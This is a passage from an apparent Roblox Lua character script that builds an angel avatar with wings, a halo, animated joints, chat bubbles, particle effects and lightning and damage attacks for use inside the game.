	naeeym2.PlayerToHideFrom = Plr
	local tecks2 = IN("TextLabel",naeeym2)
	tecks2.BackgroundTransparency = 1
	tecks2.TextScaled = true
	tecks2.BorderSizePixel = 0
	tecks2.Text = "The Angle"
	tecks2.Font = Enum.Font.Bodoni
	tecks2.TextSize = 30
	tecks2.TextStrokeTransparency = 0
	tecks2.TextColor3 = C3.N(0,0,0)
	tecks2.TextStrokeColor3 = C3.N(1,1,0)
	tecks2.Size = UDim2.new(1,0,0.5,0)
	tecks2.Parent = naeeym2

	pcall(function()
		Char.LeftWing:destroy()
		Char.ReaperShadowHead:destroy()
	end)

	for _,v in next, Char:children() do
		if(v:IsA'BasePart' and v.Transparency < 1 and v ~= Head)then
			NewInstance("SelectionBox",v,{Adornee=v,LineThickness=.01,Color3=C3.N(1,1,0)})
			if(v ~= Head)then IN("BlockMesh",v) end
		end
	end

	local HaloHandle = NewInstance("Part",Halo,{Size=V3.N(.05,.05,.05),Transparency=1,CanCollide=false,Anchored=false,Locked=true,})
	local WingHandle = NewInstance("Part",Wings,{Size=V3.N(.05,.05,.05),Transparency=1,CanCollide=false,Anchored=false,Locked=true,})

	for i = 1, 360,5 do
		local part = NewInstance("Part",Halo,{BrickColor=BrickColor.new"New Yeller",Material=Enum.Material.Neon,Size=V3.N(0.69,0.1,0.3),Anchored=false,CanCollide=false,Locked=true,Transparency=.6})
		local weld = NewInstance("Weld",part,{Part0=HaloHandle,Part1=part,C0=CF.A(0,M.R(i),0)*CF.N(0,0,-.6)})
	end

	if(PlayerSize ~= 1)then
		for _,v in next, Char:GetDescendats() do
			if(v:IsA'BasePart')then
				v.Size = v.Size * PlayerSize
			end
		end
	end

	local Music = Sound(Char,MusicID,1,3,true,false,true)
	Music.Name = 'Music'

	-- Wing Creation
	local FeatherWelds = {{},{}}
	local inc = 1
	for aa = 1, 4 do
		local lastFeather;
		FeatherWelds[1][aa] = {}
		for i = 1, 4+inc do
			local feather = NewInstance("Part",Wings,{CustomPhysicalProperties=PhysicalProperties.new(0,0,0,0,0),TopSurface=10,BottomSurface=10,Size=V3.N(2,.5,.75),CanCollide=false,Color=C3.N(1,1,1)})
			NewInstance("SpecialMesh",feather,{MeshType=Enum.MeshType.Sphere})
			if(lastFeather)then
				table.insert(FeatherWelds[1][aa],NewInstance("Weld",feather,{Part0=lastFeather,Part1=feather,C0=CF.N(.5,.25,0)*CF.A(0,0,M.R(-5))}))
			else
				table.insert(FeatherWelds[1][aa],NewInstance("Weld",feather,{Part0=feather,Part1=WingHandle,C0=CF.N(-2,aa/4,0)*CF.A(0,0,M.R(-5))}))
			end
			lastFeather = feather
		end
		inc = inc + 1
	end

	local inc = 1
	for aa = 1, 4 do
		local lastFeather;
		FeatherWelds[2][aa] = {}
		for i = 1, 4+inc do
			local feather = NewInstance("Part",Wings,{CustomPhysicalProperties=PhysicalProperties.new(0,0,0,0,0),TopSurface=10,BottomSurface=10,Size=V3.N(2,.5,.75),CanCollide=false,Color=C3.N(1,1,1)})
			NewInstance("SpecialMesh",feather,{MeshType=Enum.MeshType.Sphere})
			if(lastFeather)then
				table.insert(FeatherWelds[2][aa],NewInstance("Weld",feather,{Part0=lastFeather,Part1=feather,C0=CF.N(-.5,.25,0)*CF.A(0,0,M.R(5))}))
			else
				table.insert(FeatherWelds[2][aa],NewInstance("Weld",feather,{Part0=feather,Part1=WingHandle,C0=CF.N(2,aa/4,0)*CF.A(0,0,M.R(5))}))
			end
			lastFeather = feather
		end
		inc = inc + 1
	end

	--// Stop animations \\--
	for _,v in next, Hum:GetPlayingAnimationTracks() do
		v:Stop();
	end

	pcall(game.Destroy,Char:FindFirstChild'Animate')
	pcall(game.Destroy,Hum:FindFirstChild'Animator')

	--// Joints \\--

	local LS = NewInstance('Motor',Char,{Part0=Torso,Part1=LArm,C0 = CF.N(-1.5 * PlayerSize,0.5 * PlayerSize,0),C1 = CF.N(0,.5 * PlayerSize,0)})
	local RS = NewInstance('Motor',Char,{Part0=Torso,Part1=RArm,C0 = CF.N(1.5 * PlayerSize,0.5 * PlayerSize,0),C1 = CF.N(0,.5 * PlayerSize,0)})
	local NK = NewInstance('Motor',Char,{Part0=Torso,Part1=Head,C0 = CF.N(0,1.5 * PlayerSize,0)})
	local LH = NewInstance('Motor',Char,{Part0=Torso,Part1=LLeg,C0 = CF.N(-.5 * PlayerSize,-1 * PlayerSize,0),C1 = CF.N(0,1 * PlayerSize,0)})
	local RH = NewInstance('Motor',Char,{Part0=Torso,Part1=RLeg,C0 = CF.N(.5 * PlayerSize,-1 * PlayerSize,0),C1 = CF.N(0,1 * PlayerSize,0)})
	local RJ = NewInstance('Motor',Char,{Part0=Root,Part1=Torso})
	local HW = NewInstance('Motor',Char,{Part0=Head,Part1=HaloHandle,C0=CF.N(0,2,0)}) 
	local WW = NewInstance('Motor',Char,{Part0=Torso,Part1=WingHandle,C0=CF.N(0,1.5,1.5)}) 

	local LSC0 = LS.C0
	local RSC0 = RS.C0
	local NKC0 = NK.C0
	local LHC0 = LH.C0
	local RHC0 = RH.C0
	local RJC0 = RJ.C0

	--// Artificial HB \\--

	local ArtificialHB = IN("BindableEvent", script)
	ArtificialHB.Name = "Heartbeat"

	script:WaitForChild("Heartbeat")

	local tf = 0
	local allowframeloss = false
	local tossremainder = false
	local lastframe = tick()
	local frame = 1/Frame_Speed
	ArtificialHB:Fire()

	game:GetService("RunService").Heartbeat:connect(function(s, p)
		tf = tf + s
		if tf >= frame then
			if allowframeloss then
				script.Heartbeat:Fire()
				lastframe = tick()
			else
				for i = 1, math.floor(tf / frame) do
					ArtificialHB:Fire()
				end
				lastframe = tick()
			end
			if tossremainder then
				tf = 0
			else
				tf = tf - frame * math.floor(tf / frame)
			end
		end
	end)

	function swait(num)
		if num == 0 or num == nil then
			ArtificialHB.Event:wait()
		else
			for i = 0, num do
				ArtificialHB.Event:wait()
			end
		end
	end


	--// Effect Function(s) \\--


	function Chat(text)
		--if(game.PlaceId ~= 843468296)then
		coroutine.wrap(function()
			if(Char:FindFirstChild'ChatGUI')then Char.ChatGUI:destroy() end
			local BBG = NewInstance("BillboardGui",Char,{Name='ChatGUI',Size=UDim2.new(0,100,0,40),StudsOffset=V3.N(0,3,0),Adornee=Head})
			local Txt = NewInstance("TextLabel",BBG,{Text = "",BackgroundTransparency=1,TextColor3=C3.N(1,1,0),BorderSizePixel=0,Font=Enum.Font.Garamond,TextSize=30,TextStrokeTransparency=1,Size=UDim2.new(1,0,.5,0)})
			local SND = Sound(Head,418252437,M.RNG(9,11)/10,3,false,false,true)
			for i = 1, #text do
				delay(i/25, function()
					SND.Pitch = M.RNG(9,11)/10
					SND.Volume = 3
					SND.Parent = Effects
					SND:Play()
					Txt.Text = text:sub(1,i)
				end)
			end
			delay((#text/25)+2, function()
				Txt.Text = ""
				for i = 1, #text do
					Txt.Text = Txt.Text.. string.char(M.RNG(0,126))
				end
			end)
			delay((#text/25)+3, function()
				BBG:destroy()
				SND:destroy()
			end)
		end)()
		--else
		--	Chat2(text)
		--end
	end

	function Chat2(text)
		coroutine.wrap(function()
			if(Char:FindFirstChild'ChatGUI')then Char.ChatGUI:destroy() end
			local BBG = NewInstance("BillboardGui",Char,{Name='ChatGUI',Size=UDim2.new(0,100,0,40),StudsOffset=V3.N(0,3,0),Adornee=Head})
			local offset = 0;
			local xsize = 0;
			for i = 1, #text do
				offset = offset - 16
				xsize = xsize + 32 	
				delay(i/25, function()
					local Txt = NewInstance("TextLabel",BBG,{Text = text:sub(i,i),Position=UDim2.new(0,offset,0,0),BackgroundTransparency=1,TextColor3=C3.N(1,1,0),BorderSizePixel=0,Font=Enum.Font.Garamond,TextSize=40,TextStrokeTransparency=1,Size=UDim2.new(1,0,.5,0)})
					offset = offset + 32
					while Txt and Txt.Parent do
						Txt.Rotation = M.RNG(-15,15)
						swait()
					end
				end)
			end
			BBG.Size = UDim2.new(0,xsize,0,40)
			delay((#text/25)+3, function()
				for _,v in next, BBG:children() do
					pcall(function() v.Text = string.char(M.RNG(0,126)) end)
				end
			end)
			delay((#text/25)+4, function()
				BBG:destroy()
			end)
		end)()
	end


	function Transparency(trans)
		for _,v in next, Char:children() do
			if(v:IsA'BasePart' and v ~= Root and v ~= HaloHandle and v ~= WingHandle)then
				v.Transparency = trans
				local sbox = v:findFirstChild'SelectionBox'
				if(sbox)then sbox.Transparency=trans end
			elseif(v:IsA'Accessory' and v:FindFirstChild'Handle')then
				v.Handle.Transparency=trans
			end
		end	
		for _,v in next, Wings:children() do
			if(v:IsA'BasePart' and v ~= WingHandle)then
				v.Transparency = trans
				local sbox = v:findFirstChild'SelectionBox'
				if(sbox)then sbox.Transparency=trans end
			end
		end	
		for _,v in next, Halo:children() do
			if(v:IsA'BasePart' and v ~= HaloHandle)then
				v.Transparency = trans
				local sbox = v:findFirstChild'SelectionBox'
				if(sbox)then sbox.Transparency=trans end
			end
		end	
	end

	local FXTable = {}

	function Bezier(startpos, pos2, pos3, endpos, t)
		local A = startpos:lerp(pos2, t)
		local B  = pos2:lerp(pos3, t)
		local C = pos3:lerp(endpos, t)
		local lerp1 = A:lerp(B, t)
		local lerp2 = B:lerp(C, t)
		local cubic = lerp1:lerp(lerp2, t)
		return cubic
	end

	function Tween(obj,props,time,easing,direction,repeats,backwards)
		local info = TweenInfo.new(time or .5, easing or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out, repeats or 0, backwards or false)
		local tween = S.TweenService:Create(obj, info, props)

		tween:Play()
	end

	coroutine.resume(coroutine.create(function()
		while true do
			for i = 1, #FXTable do
				local data = FXTable[i]
				if(data)then
					local Frame = data.Frame
					local FX = data.Effect or 'ResizeAndFade'
					local Parent = data.Parent or Effects
					local Color = data.Color or C3.N(0,0,0)
					local Size = data.Size or V3.N(1,1,1)
					local MoveDir = data.MoveDirection or nil
					local MeshData = data.Mesh or nil
					local SndData = data.Sound or nil
					local Frames = data.Frames or 45
					local CFra = data.CFrame or Torso.CFrame
					local Settings = data.FXSettings or {}
					local Prt,Msh,Snd = data.Part,data.Mesh,data.Sound
					local grow = data.Grow

					local MoveSpeed = nil;
					if(MoveDir)then
						MoveSpeed = (CFra.p - MoveDir).magnitude/Frames
					end
					if(FX ~= 'Arc')then
						Frame = Frame + 1
						if(FX == "Fade")then
							Prt.Transparency  = (Frame/Frames)
						elseif(FX == "Resize")then
							if(not Settings.EndSize)then
								Settings.EndSize = V3.N(0,0,0)
							end
							if(Settings.EndIsIncrement)then
								if(Msh)then
									Msh.Scale = Msh.Scale + Settings.EndSize
								else
									Prt.Size = Prt.Size + Settings.EndSize
								end					
							else
								if(Msh)then
									Msh.Scale = Msh.Scale - grow/Frames
								else
									Prt.Size = Prt.Size - grow/Frames
								end
							end 
						elseif(FX == "ResizeAndFade")then
							if(not Settings.EndSize)then
								Settings.EndSize = V3.N(0,0,0)
							end
							if(Settings.EndIsIncrement)then
								if(Msh)then
									Msh.Scale = Msh.Scale + Settings.EndSize
								else
									Prt.Size = Prt.Size + Settings.EndSize
								end					
							else
								if(Msh)then
									Msh.Scale = Msh.Scale - grow/Frames
								else
									Prt.Size = Prt.Size - grow/Frames
								end
							end 
							Prt.Transparency = (Frame/Frames)
						end
						if(Settings.RandomizeCFrame)then
							Prt.CFrame = Prt.CFrame * CF.A(M.RRNG(-360,360),M.RRNG(-360,360),M.RRNG(-360,360))
						end
						if(MoveDir and MoveSpeed)then
							local Orientation = Prt.Orientation
							Prt.CFrame = CF.N(Prt.Position,MoveDir)*CF.N(0,0,-MoveSpeed)
							Prt.Orientation = Orientation
						end
						if(Prt.Transparency >= 1 or Frame >= Frames)then
							Prt:destroy()
							table.remove(FXTable,i)
						else
							data.Frame = Frame
						end
					else
						local start,third,fourth,endP = Settings.Start,Settings.Third,Settings.Fourth,Settings.End
						if(not Settings.End and Settings.Home)then endP = Settings.Home.CFrame end
						if(start and endP)then
							local quarter = third or start:lerp(endP, 0.25) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
							local threequarter = fourth or start:lerp(endP, 0.75) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
							Frame = Frame + Settings.Speed or 0.01
							if(Settings.Home)then
								endP = Settings.Home.CFrame
							end
							Prt.CFrame = Bezier(start, quarter, threequarter, endP, i)
							if(Prt.Transparency >= 1 or Frame >= Frames)then
								if(Settings.RemoveOnGoal)then
									Prt:destroy()
								end
							end
						else

						end
					end
				end
			end
			swait()
		end
	end))

	function Effect(data)
		local FX = data.Effect or 'ResizeAndFade'
		local Parent = data.Parent or Effects
		local Color = data.Color or C3.N(0,0,0)
		local Size = data.Size or V3.N(1,1,1)
		local MoveDir = data.MoveDirection or nil
		local MeshData = data.Mesh or nil
		local SndData = data.Sound or nil
		local Frames = data.Frames or 45
		local Manual = data.Manual or nil
		local Material = data.Material or nil
		local CFra = data.CFrame or Torso.CFrame
		local Settings = data.FXSettings or {}
		local Shape = data.Shape or Enum.PartType.Block
		local Snd,Prt,Msh;
		if(Manual and typeof(Manual) == 'Instance' and Manual:IsA'BasePart')then
			Prt = Manual
		else
			Prt = Part(Parent,Color,Material,Size,CFra,true,false)
			Prt.Shape = Shape
		end
		if(typeof(MeshData) == 'table')then
			Msh = Mesh(Prt,MeshData.MeshType,MeshData.MeshId,MeshData.TextureId,MeshData.Scale,MeshData.Offset)
		elseif(typeof(MeshData) == 'Instance')then
			Msh = MeshData:Clone()
			Msh.Parent = Prt
		elseif(Shape == Enum.PartType.Block)then
			Msh = Mesh(Prt,Enum.MeshType.Brick)
		end
		if(typeof(SndData) == 'table' or typeof(SndData) == 'Instance')then
			Snd = Sound(Prt,SndData.SoundId,SndData.Pitch,SndData.Volume,false,false,true)
		end
		if(Snd)then
			repeat wait() until Snd.Playing and Snd.IsLoaded and Snd.TimeLength > 0
			data.Frames = Snd.TimeLength * Frame_Speed/Snd.Pitch
		end
		data.Part = Prt
		data.Mesh = Msh
		data.Sound = Snd
		data.Frame = 0
		data.Size = (Msh and Msh.Scale or Size)
		Size = (Msh and Msh.Scale or Size)
		data.Grow = Size-(Settings.EndSize or (Msh and Msh.Scale or Size)/2)
		table.insert(FXTable,data)
		return Prt,Msh,Snd
	end

	function Zap(data)
		local sCF,eCF = data.StartCFrame,data.EndCFrame
		assert(sCF,"You need a start CFrame!")
		assert(eCF,"You need an end CFrame!")
		local parts = data.PartCount or 15
		local zapRot = data.ZapRotation or {-5,5}
		local startThick = data.StartSize or 3;
		local endThick = data.EndSize or startThick/2;
		local color = data.Color or BrickColor.new'Electric blue'
		local delay = data.Delay or 35
		local delayInc = data.DelayInc or 0
		local lastLightning;
		local MagZ = (sCF.p - eCF.p).magnitude
		local thick = startThick
		local inc = (startThick/parts)-(endThick/parts)

		for i = 1, parts do
			local pos = sCF.p
			if(lastLightning)then
				pos = lastLightning.CFrame*CF.N(0,0,MagZ/parts/2).p
			end
			delay = delay + delayInc
			local zapPart = Part(Effects,color,Enum.Material.Neon,V3.N(thick,thick,MagZ/parts),CF.N(pos),true,false)
			local posie = CF.N(pos,eCF.p)*CF.N(0,0,MagZ/parts).p+V3.N(M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)))
			if(parts == i)then
				local MagZ = (pos-eCF.p).magnitude
				zapPart.Size = V3.N(endThick,endThick,MagZ)
				zapPart.CFrame = CF.N(pos, eCF.p)*CF.N(0,0,-MagZ/2)
				Effect{Effect='ResizeAndFade',Size=V3.N(thick,thick,thick),CFrame=eCF*CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180)),Color=color,Frames=delay*2,FXSettings={EndSize=V3.N(thick*8,thick*8,thick*8)}}
			else
				zapPart.CFrame = CF.N(pos,posie)*CF.N(0,0,MagZ/parts/2)
			end

			lastLightning = zapPart
			Effect{Effect='Fade',Manual=zapPart,Frames=delay}

			thick=thick-inc

		end
	end


	function SoulSteal(whom)
		local torso = (whom:FindFirstChild'Head' or whom:FindFirstChild'Torso' or whom:FindFirstChild'UpperTorso' or whom:FindFirstChild'LowerTorso' or whom:FindFirstChild'HumanoidRootPart')
		if(torso and torso:IsA'BasePart')then
			local Model = Instance.new("Model",Effects)
			Model.Name = whom.Name.."'s Soul"
			whom:BreakJoints()
			local Soul = Part(Model,BrickColor.new'Really red','Glass',V3.N(.5,.5,.5),torso.CFrame,true,false)
			Soul.Name = 'Head'
			NewInstance("Humanoid",Model,{Health=0,MaxHealth=0})
			Effect{
				Effect="Arc",
				Manual = Soul,
				FXSettings={
					Start=torso.CFrame,
					Home = Torso,
					RemoveOnGoal = true,
				}
			}
			local lastPoint = Soul.CFrame.p

			for i = 0, 1, 0.01 do 
				local point = CFrame.new(lastPoint, Soul.Position) * CFrame.Angles(-math.pi/2, 0, 0)
				local mag = (lastPoint - Soul.Position).magnitude
				Effect{
					Effect = "Fade",
					CFrame = point * CF.N(0, mag/2, 0),
					Size = V3.N(.5,mag+.5,.5),
					Color = Soul.BrickColor
				}
				lastPoint = Soul.CFrame.p
				swait()
			end
			for i = 1, 5 do
				Effect{
					Effect="Fade",
					Color = BrickColor.new'Really red',
					MoveDirection = (Torso.CFrame*CFrame.new(M.RNG(-40,40),M.RNG(-40,40),M.RNG(-40,40))).p
				}	
			end
		end
	end

	--// Other Functions \\ --

	function getRegion(point,range,ignore)
		return workspace:FindPartsInRegion3WithIgnoreList(R3.N(point-V3.N(1,1,1)*range/2,point+V3.N(1,1,1)*range/2),ignore,100)
	end

	function CastRay(startPos,endPos,range,ignoreList)
		local ray = Ray.new(startPos,(endPos-startPos).unit*range)
		local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
		return part,pos,norm,(pos and (startPos-pos).magnitude)
	end


	function WingFlutter(Alpha)
		Alpha = Alpha or .1
		for x = 1, 4 do
			if(FeatherWelds[1][x][1])then
				FeatherWelds[1][x][1].C0 = FeatherWelds[1][x][1].C0:lerp(CF.N(-2-.5*M.C(Sine/24),x/4,0-.2*-M.S(Sine/24)),Alpha)
			end
			for i = 2, #FeatherWelds[1][x] do
				FeatherWelds[1][x][i].C0 = FeatherWelds[1][x][i].C0:lerp(CF.N(.5,.25,0)*CF.A(0,0,M.R(-5+2*M.C(Sine/12))),Alpha)
			end
		end
		for x = 1, 4 do
			if(FeatherWelds[2][x][1])then
				FeatherWelds[2][x][1].C0 = FeatherWelds[2][x][1].C0:lerp(CF.N(2+.5*M.C(Sine/24),x/4,0-.4*M.S(Sine/24)),Alpha)
			end
			for i = 2, #FeatherWelds[2][x] do
				FeatherWelds[2][x][i].C0 = FeatherWelds[2][x][i].C0:lerp(CF.N(-.5,.25,0)*CF.A(0,0,M.R(5-2*M.C(Sine/12))),Alpha)
			end
		end
	end

	function clerp(startCF,endCF,alpha)
		return startCF:lerp(endCF, alpha)
	end

	function GetTorso(char)
		return char:FindFirstChild'Torso' or char:FindFirstChild'UpperTorso' or char:FindFirstChild'LowerTorso' or char:FindFirstChild'HumanoidRootPart'
	end

	function ShowDamage(Pos, Text, Time, Color)
		local Rate = (1 / 30)
		local Pos = (Pos or Vector3.new(0, 0, 0))
		local Text = (Text or "")
		local Time = (Time or 2)
		local Color = (Color or Color3.new(1, 0, 1))
		local EffectPart = NewInstance("Part",Effects,{
			Material=Enum.Material.SmoothPlastic,
			Reflectance = 0,
			Transparency = 1,
			BrickColor = BrickColor.new(Color),
			Name = "Effect",
			Size = Vector3.new(0,0,0),
			Anchored = true
		})
		local BillboardGui = NewInstance("BillboardGui",EffectPart,{
			Size = UDim2.new(1.25, 0, 1.25, 0),
			Adornee = EffectPart,
		})
		local TextLabel = NewInstance("TextLabel",BillboardGui,{
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0),
			Text = Text,
			Font = "Arial",
			TextColor3 = Color,
			TextStrokeColor3 = Color3.new(0,0,0),
			TextStrokeTransparency=0,
			TextScaled = true,
		})
		game.Debris:AddItem(EffectPart, (Time))
		EffectPart.Parent = game:GetService("Workspace")
		delay(0, function()
			local Frames = (Time / Rate)
			for Frame = 1, Frames do
				wait(Rate)
				local Percent = (Frame / Frames)
				EffectPart.CFrame = CFrame.new(Pos) + Vector3.new(0, Percent, 0)
				TextLabel.TextTransparency = Percent
				TextLabel.TextStrokeTransparency = Percent
			end
			if EffectPart and EffectPart.Parent then
				EffectPart:Destroy()
			end
		end)
	end


	function DealDamage(who,minDam,maxDam,Knock,Type,critChance,critMult)
		if(who)then
			local hum = who:FindFirstChildOfClass'Humanoid'
			local Damage = -math.huge
			local canHit = true
			if(hum)then
				for _, p in pairs(Hit) do
					if p[1] == hum then
						if(time() - p[2] < 0.1) then
							canHit = false
						else
							Hit[_] = nil
						end
					end
				end
				if(canHit)then
					table.insert(Hit,{hum,time()})
					if(hum.Health >= math.huge)then
						who:BreakJoints()
						if(who:FindFirstChild'Head' and hum.Health > 0)then
							ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), "INSTANT", 1.5, C3.N(1,0,0))
						end
					else
						local player = S.Players:GetPlayerFromCharacter(who)
						if(Type == "Fire")then
							--idk..
						else
							local  c = Instance.new("ObjectValue",hum)
							c.Name = "creator"
							c.Value = Plr
							game:service'Debris':AddItem(c,0.35)
							if(M.RNG(1,100) <= (critChance or 0) and critMult > 1)then
								if(who:FindFirstChild'Head' and hum.Health > 0)then
									ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), "[CRIT] "..Damage*(critMult or 2), 1.5, BrickColor.new'New Yeller'.Color)
								end
								hum.Health = hum.Health - Damage*(critMult or 2)
							else
								if(who:FindFirstChild'Head' and hum.Health > 0)then
									ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), Damage, 1.5, DamageColor.Color)
								end
								hum.Health = hum.Health - Damage
							end
							if(Type == 'Knockback' and GetTorso(who))then
								local angle = GetTorso(who).Position - Root.Position + Vector3.new(0, 0, 0).unit
								local body = NewInstance('BodyVelocity',GetTorso(who),{
									P = 500,
									maxForce = V3.N(math.huge,0,math.huge),
									velocity = Root.CFrame.lookVector * Knock + Root.Velocity / 1.05
								})
								game:service'Debris':AddItem(body,.5)
							elseif(Type == "Electric")then
								if(M.RNG(1,100) >= critChance)then
									if(who:FindFirstChild'Head' and hum.Health > 0)then
										ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), "[PARALYZED]", 1.5, BrickColor.new"New Yeller".Color)
									end
									local asd = hum.WalkSpeed/2
									hum.WalkSpeed = asd
									local paralyzed = true
									coroutine.wrap(function()
										while paralyzed do
											swait(25)
											if(M.RNG(1,25) == 1)then
												if(who:FindFirstChild'Head' and hum.Health > 0)then
													ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), "[STATIC]", 1.5, BrickColor.new"New Yeller".Color)
												end
												hum.PlatformStand = true
											end
										end
									end)()
									delay(4, function()
										paralyzed = false
										hum.WalkSpeed = hum.WalkSpeed + asd
									end)
								end

							elseif(Type == 'Knockdown' and GetTorso(who))then
								local rek = GetTorso(who)
								hum.PlatformStand = true
								delay(1,function()
									hum.PlatformStand = false
								end)
								local angle = (GetTorso(who).Position - (Root.Position + Vector3.new(0, 0, 0))).unit
								local bodvol = NewInstance("BodyVelocity",rek,{
									velocity = angle * Knock,
									P = 5000,
									maxForce = Vector3.new(8e+003, 8e+003, 8e+003),
								})
								local rl = NewInstance("BodyAngularVelocity",rek,{
									P = 3000,
									maxTorque = Vector3.new(500000, 500000, 500000) * 50000000000000,
									angularvelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10)),
								})
								game:GetService("Debris"):AddItem(bodvol, .5)
								game:GetService("Debris"):AddItem(rl, .5)
							end
						end
					end
				end
			end
		end
	end

	function AOEDamage(where,range,minDam,maxDam,Knock,Type,critChance,critMult)
		for _,v in next, getRegion(where,range,{Char}) do
			if(v.Parent and v.Parent:FindFirstChildOfClass'Humanoid')then
				DealDamage(v.Parent,minDam,maxDam,Knock,Type,critChance,critMult)
			end
		end
	end
	function AOEHeal(where,range,amount)
		local healed = {}
		for _,v in next, getRegion(where,range,{Char}) do
			local hum = (v.Parent and v.Parent:FindFirstChildOfClass'Humanoid' or nil)
			if(hum and not healed[hum])then
				hum.Health = hum.Health + amount
				if(v.Parent:FindFirstChild'Head' and hum.Health > 0)then
					ShowDamage((v.Parent.Head.CFrame * CF.N(0, 0, (v.Parent.Head.Size.Z / 2)).p+V3.N(0,1.5,0)), "+"..amount, 1.5, BrickColor.new'Lime green'.Color)
				end
			end
		end
	end


	--// Attack Functions \\--

	function Smite()
		Zap{
			StartCFrame=CF.N(Mouse.Hit.p)*CF.N(0,500,0),
			EndCFrame=CF.N(Mouse.Hit.p),
			ZapRotation = {-5,5},
			StartSize = 5,
			EndSize = 1,
			Delay=5,
			DelayInc=1,
		}
		AOEDamage(Mouse.Hit.p,3,15,35,false,"Electric",75,1)
	end

	function LightningStorm()
		Attack = true
		Rooted = true
		NeutralAnims = false
		Hum.AutoRotate = false
		repeat swait()
			Root.CFrame = Root.CFrame:lerp(CF.N(Root.CFrame.p,V3.N(Mouse.Hit.x,Root.CFrame.y,Mouse.Hit.z)),.1)
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.0109784482, 0.00629424211+.25*M.C(Sine/12), 0.00456619123, 0, 0.00628576428, 0.999979854, 0, 0.99998033, -0.00628576661, -0.999999702, -7.27595761e-12, 0)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.51089513, 0.618211091+.1*M.C(Sine/12), -0.00361234695, 0.982347131, 0.18641524, 0.0156120034, -0.186530694, 0.982429147, 0.00628500059, -0.0141660646, -0.0090861693, 0.999858379)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.17289495, 0.616719723+.1*M.C(Sine/12), 0.011598235, -0.52721566, -0.849588335, 0.0156120034, 0.849726856, -0.527186096, 0.00628500059, 0.0028907666, 0.0165794864, 0.999858379)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00954779983, 1.49905622, 0.00156322215, -1.82539225e-07, 0.0574940294, -0.998345554, 0.00628540665, 0.998326242, 0.0574929155, 0.999979854, -0.00627500098, -0.000361557119),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		until not S.UserInputService:IsKeyDown(Enum.KeyCode.C)
		local where = Mouse.Hit.p
		for i = 0, 6, .1 do
			swait()
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.0109784482, 0.00629424211+.25*M.C(Sine/12), 0.00456619123, 0, 0.00628576428, 0.999979854, 0, 0.99998033, -0.00628576661, -0.999999702, -7.27595761e-12, 0)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.51089513, 0.618211091+.1*M.C(Sine/12), -0.00361234695, 0.982347131, 0.18641524, 0.0156120034, -0.186530694, 0.982429147, 0.00628500059, -0.0141660646, -0.0090861693, 0.999858379)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
